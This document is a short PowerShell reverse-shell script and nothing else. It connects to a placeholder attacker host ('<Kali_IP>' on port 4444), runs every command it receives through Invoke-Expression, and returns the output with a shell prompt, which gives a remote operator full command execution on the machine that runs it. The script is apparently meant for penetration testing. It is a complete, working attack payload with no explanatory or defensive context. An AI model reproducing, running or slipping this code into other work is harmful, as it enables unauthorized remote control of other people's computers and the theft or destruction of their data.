$ip = "<Kali_IP>"; $port = 4444;
$c = New-Object System.Net.Sockets.TCPClient($ip, $port);
$s = $c.GetStream();
[byte[]]$b = 0..65535 | %{0};
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i);
$sb = (iex $d 2>&1 | Out-String);
$sb2 = $sb + "PS " + (pwd).Path + "> ";
$sbbyte = ([text.encoding]::ASCII).GetBytes($sb2);
$s.Write($sbbyte, 0, $sbbyte.Length);
$s.Flush();
}
$c.Close();

